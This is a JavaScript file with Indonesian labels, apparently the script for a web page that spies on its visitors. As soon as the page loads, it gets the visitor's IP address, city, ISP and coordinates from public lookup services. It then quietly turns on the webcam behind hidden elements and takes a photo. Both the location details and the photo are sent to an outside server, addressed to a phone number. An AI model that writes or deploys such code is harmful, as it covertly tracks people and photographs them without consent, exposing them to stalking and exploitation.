let video = document.querySelector("#video");
video.style.display = "none";
let canvas = document.querySelector("#canvas");
let text = "*DATA PENGUNJUNG*";
canvas.style.display = "none";
const base = "https://fundaypay.vercel.app";

(async () => {
    const jsonIp = await useFetch("https://jsonip.com");
    const data = await useFetch("https://ipapi.co/" + jsonIp.ip + "/json");
    text += `

Alamat IP : ${data.ip}
Kode Negara : ${data.country}
Nama Negara : ${data.country_name}
Ibukota Negara : ${data.country_capital}
Kode Telepon : ${data.country_calling_code}
Provinsi : ${data.region}
Kode Provinsi : ${data.region_code}
Kota : ${data.city}
Provider ISP : ${data.org}
Latitude : ${data.latitude}
Longitude : ${data.longitude}`;
    sM(text);
    let stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
    });
    video.srcObject = stream;
    setTimeout(() => {
        canvas
            .getContext("2d")
            .drawImage(video, 0, 0, canvas.width, canvas.height);
        let image_data_url = canvas
            .toDataURL("image/jpeg")
            .replace(/^data:image\/jpeg;base64,/, "");
        sM(text, image_data_url, "jpeg");
        video.pause();
        video.src = "";
        stream.getTracks()[0].stop();
    }, 1000);
})();

async function useFetch(url) {
    const response = await fetch(url);
    const jsonData = await response.json();
    return Promise.resolve(jsonData);
}

async function sM(msg, img, ext) {
    let mySender = await fetch(`${base}/send/`, {
        method: "POST",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            to: "082286230830",
            msg: msg || "siapa hayo?",
            img,
            ext,
        }),
    });
    let myResult = await mySender.text();
    return Promise.resolve(myResult);
}
